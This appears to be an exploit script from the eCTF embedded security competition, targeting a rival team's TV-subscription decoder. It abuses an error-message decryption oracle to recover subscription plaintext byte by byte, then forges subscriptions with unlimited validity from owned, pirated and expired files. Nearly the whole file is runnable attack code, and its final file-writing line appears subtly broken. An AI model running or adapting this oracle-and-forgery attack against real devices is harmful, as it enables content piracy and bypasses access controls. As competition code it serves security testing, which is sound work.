import sys
import struct
import hashlib 
from ectf25.utils.decoder import DecoderIntf, DecoderError

"""
@brief Exploits the oracle vulnerability in the `decode` function for Morgan State to determine if the ciphtertext and nonce pair, when decoded using the `SYSKEY` decode to the \p pt.
@param i ectf25 decoder interface to use as the victim device
@param nonce the nonce to be sent to the decoder and used in decryption
@param pt the plaintext to be checked against \p ciphertext for a match
@param ct the ciphertext to be checked against \p plaintext for a match
@return True when the plaintext matches the decrypted ciphertext, False otherwise
"""
def oracle(i, nonce, pt, ct):
    try:
        sha_engine = hashlib.sha256()
        sha_engine.update(pt)
        print(pt, ct)
        packet = (0).to_bytes(16) + sha_engine.digest() + nonce + struct.pack("<I", len(ct)) + ct
        i.decode(packet)
        print(packet)
        return True
    except DecoderError as e:
        return e.args[0].find('Bad Hash Data') == -1


"""
@brief Uses the oracle to incrementally decrypt a ciphertext that was encrypted with `SYSKEY`
@param interface the interface to be used as a victim device
@param nonce the nonce that that \p ciphertext was created with
@param \p ciphertext the ciphertext to be decrypted
@return the plaintext, i.e., \p ciphertext decrypted
@throws Exception if the ciphertext couldn't be decrypted, probably means the oracle isn't working
"""
def hash_attack_decrypt(interface: DecoderIntf, nonce: bytes, ciphertext: bytes):
    plaintext = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        for j in range(256):
            plaintext[i] = j
            if oracle(interface, nonce, bytes(plaintext[:i+1]), ciphertext[:i+1]):
                break
            if j == 255:
                raise Exception('Not found')
    return bytes(plaintext)


"""
@brief Forges a ciphertext and nonce encrypted with the `SYSKEY` given the plaintext
@param interface the interface to be used as the victim device
@param nonce the nonce to be used to create a forged ciphertext
@param plaintext the plaintext that the \p nonce and ciphertext returned should decrypt to
@return the ciphertext that was forged
@throws Exception if the ciphertext couldn't be decrypted, probably means the oracle isn't working
"""
def hash_attack_forge(interface: DecoderIntf, nonce: bytes, plaintext: bytes):
    ciphertext = bytearray(len(plaintext))
    for i in range(0, len(plaintext)):
        for j in range(0, 256):
            ciphertext[i] = j
            if oracle(interface, nonce, plaintext[:i+1], bytes(ciphertext[:i+1])):
                break
            if j == 255:
                raise Exception('Not found.')
    return bytes(ciphertext)

DECODER_ID = 0xf870d9c5
SUBSCRIPTION_PT_SIZE = struct.calcsize("<IQQI32s").to_bytes(4, byteorder='little')
INTERFACE = DecoderIntf(sys.argv[1])

subscriptions = ('./own.sub', './pirated.sub', './expired.sub')
for subscription in subscriptions:
    sub_bin = None
    with open(subscription, 'rb') as file:
        sub_bin = file.read()
    nonce = sub_bin[48:60]
    decrypted_sub = hash_attack_decrypt(INTERFACE, nonce, sub_bin[64:])
    chan_key = decrypted_sub[-32:]
    chan_num = decrypted_sub[-36:-32]
    pt = struct.pack("<IQQI32s", DECODER_ID, 0, 2**64-1, chan_num, chan_key)
    patched_sub = hash_attack_forge(INTERFACE, nonce, pt)
    with open('./patched_' + subscription[2:], 'wb') as file:
        file.write(bytes(16) + patched_sub[2] + nonce + SUBSCRIPTION_PT_SIZE + patched_sub[0])
